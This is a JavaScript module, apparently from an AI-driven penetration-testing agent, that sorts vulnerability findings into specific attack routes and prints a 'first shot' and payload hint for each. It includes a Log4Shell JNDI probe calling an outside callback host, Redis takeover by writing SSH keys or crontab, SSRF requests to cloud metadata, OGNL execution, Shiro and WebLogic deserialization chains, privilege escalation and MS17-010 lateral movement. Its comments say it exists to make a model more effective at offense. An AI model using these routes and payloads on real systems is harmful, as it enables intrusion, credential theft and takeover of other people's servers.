/**
 * 漏洞 → 具体打法 的分流器。
 *
 * 为什么需要它（实测缺口）：`summary` 的「下一步」在阶段④ 只给一句
 * 「按漏洞类型选 `injection-payloads` / `web-vuln-payloads`」——**它没有看手里到底是什么漏洞**。
 * 实测：库里有 Fastjson 反序列化、Redis 未授权、Struts2 S2-045 三条，指引一模一样。
 * 这种"通用正确"的指引对进攻毫无用处：模型还得自己判断，等于把最该帮它的那一步推回给它。
 *
 * 本模块按漏洞标题/证据里的**特征词**分流到具体技能 + 载荷入口 + 第一发该发什么。
 * 判据全部来自技能库里真实存在的技能名（由 audit-skills 的幽灵引用检查兜底），
 * 不写不存在的技能。
 */

/** 分流规则：命中即用；顺序敏感（越具体的越靠前） */
const RULES = [
  {
    id: "fastjson",
    re: /fastjson|autoType|@type/i,
    skill: "injection-payloads",
    label: "Fastjson 反序列化",
    first: "先探 `@type` 是否可控：POST `{\"@type\":\"java.lang.AutoCloseable\"...}`，看回显/报错里有没有 autoType 字样",
    payload: "1.2.47 用 `java.lang.Class` 缓存绕过；1.2.68+ 试 `expectClass`。DNSLog 先验 OOB 再上链",
  },
  {
    id: "struts2",
    re: /struts|s2-0\d\d|ognl/i,
    skill: "injection-payloads",
    label: "Struts2 OGNL",
    first: "先判版本再挑 S2 编号：S2-045 打 Content-Type，S2-016 打 action 参数",
    payload: "OGNL 执行用 `%{(#_memberAccess...)}`，先用 `id` 之类无害命令验通",
  },
  {
    id: "log4j",
    re: /log4j|log4shell|cve-2021-44228/i,
    skill: "injection-payloads",
    label: "Log4Shell",
    first: "任何被记日志的字段都试 `${jndi:ldap://DNSLOG/a}`，DNSLog 有回显即命中",
    payload: "JDK 高版本走 LDAP 本地工厂或 `ldaps`；先验 OOB，再决定是否上链",
  },
  {
    id: "redis",
    re: /redis/i,
    skill: "unauth-exploit",
    label: "Redis 未授权",
    first: "`redis-cli -h TARGET info` 直连；通了先看 `requirepass` 与 `dir`/`dbfilename`",
    payload: "写 SSH key（`config set dir /root/.ssh`）或写 crontab；主从复制 RCE 走 `SLAVEOF`",
  },
  {
    id: "unauth",
    re: /未授权|unauthor|无密码|no auth|anonymous/i,
    skill: "unauth-exploit",
    label: "未授权访问",
    first: "直接访问管理端口/接口，别先爆破——未授权是直取，爆破是绕远路",
    payload: "按服务取：Redis/Mongo/ES/Memcached/Docker API/Jenkins 各有各的直取面",
  },
  {
    id: "sql",
    re: /sql\s*注入|sqli|injection point|sqlmap/i,
    skill: "injection-payloads",
    label: "SQL 注入",
    first: "先判类型（布尔/报错/时间），再决定要不要上 sqlmap——手工确认能省大量误报",
    payload: "报错用 `extractvalue`/`updatexml`；盲注用时间；有 WAF 转 `waf-bypass`",
  },
  {
    id: "upload",
    re: /上传|upload|文件包含|lfi|rfi/i,
    skill: "web-vuln-payloads",
    label: "上传 / 文件包含",
    first: "先确认落地路径能不能访问；能访问再考虑绕过后缀检测",
    payload: "后缀用 `.phtml`/`.phar`/`.jspx`；内容加图片头；包含用 `php://filter` 读源码",
  },
  {
    id: "ssrf",
    re: /ssrf|服务端请求伪造/i,
    skill: "web-vuln-payloads",
    label: "SSRF",
    first: "先打云元数据 `169.254.169.254`，再打内网端口——SSRF 的价值在横向不在回显",
    payload: "`http://169.254.169.254/latest/meta-data/`；被拦用 302 跳转或 DNS 重绑定",
  },
  {
    id: "shiro",
    re: /shiro|rememberMe/i,
    skill: "injection-payloads",
    label: "Shiro 反序列化",
    first: "先看响应有没有 `rememberMe=deleteMe`，有就是 Shiro",
    payload: "key 爆破（默认 key 表）→ ysoserial 生成 → 注意 AES 加密与 GCM 模式差异",
  },
  {
    id: "weblogic",
    re: /weblogic|t3|iiop/i,
    skill: "injection-payloads",
    label: "WebLogic",
    first: "先探 T3/IIOP 端口是否开，再挑对应 CVE（CVE-2020-2551 / 2018-2628）",
    payload: "T3 反序列化用 ysoserial 的 JRMPClient；IIOP 走 CVE-2020-2551",
  },
  {
    id: "privesc",
    re: /提权|privilege escalation|suid|sudo/i,
    skill: "privesc-persistence",
    label: "本地提权",
    first: "先跑信息收集（`linpeas`/`winpeas`），别猜内核版本",
    payload: "Linux 看 SUID/capabilities/cron；Windows 看服务权限/未引用路径/AlwaysInstallElevated",
  },
  {
    id: "smb",
    re: /smb|ms17-010|永恒之蓝|eternalblue/i,
    skill: "lateral-movement",
    label: "SMB / 横向",
    first: "先 `netexec smb TARGET` 看签名与版本，再决定打 MS17-010 还是走凭据",
    payload: "有凭据优先 psexec/wmiexec（更安静）；无凭据才考虑 MS17-010",
  },
];

/**
 * 按漏洞列表给出一条「先打哪个、怎么打」的建议。
 * @param {Array<{title?: string, evidence?: string, cve?: string, severity?: string, target?: string}>} vulns
 * @returns {{ hit: object|null, ranked: Array<{rule: object, vuln: object}> }}
 */
export function routeVulns(vulns = []) {
  const sevRank = { critical: 0, high: 1, medium: 2, low: 3, info: 4 };
  const ranked = [];
  for (const v of vulns) {
    const hay = `${v.title || ""} ${v.cve || ""} ${v.evidence || ""}`;
    const rule = RULES.find((r) => r.re.test(hay));
    if (rule) ranked.push({ rule, vuln: v });
  }
  // 先按严重度，再按规则顺序（越具体的规则越靠前）
  ranked.sort((a, b) => {
    const sa = sevRank[a.vuln.severity] ?? 9;
    const sb = sevRank[b.vuln.severity] ?? 9;
    if (sa !== sb) return sa - sb;
    return RULES.indexOf(a.rule) - RULES.indexOf(b.rule);
  });
  return { hit: ranked.length ? ranked[0] : null, ranked };
}

/** 供「下一步」拼一句话：点技能 + 第一发 + 载荷 */
export function describeVulnRoute(ranked = []) {
  if (!ranked.length) return "";
  const { rule, vuln } = ranked[0];
  const tgt = vuln.target ? ` @ ${vuln.target}` : "";
  return `${rule.label}${tgt} → 加载 \`${rule.skill}\`｜第一发：${rule.first}｜载荷：${rule.payload}`;
}
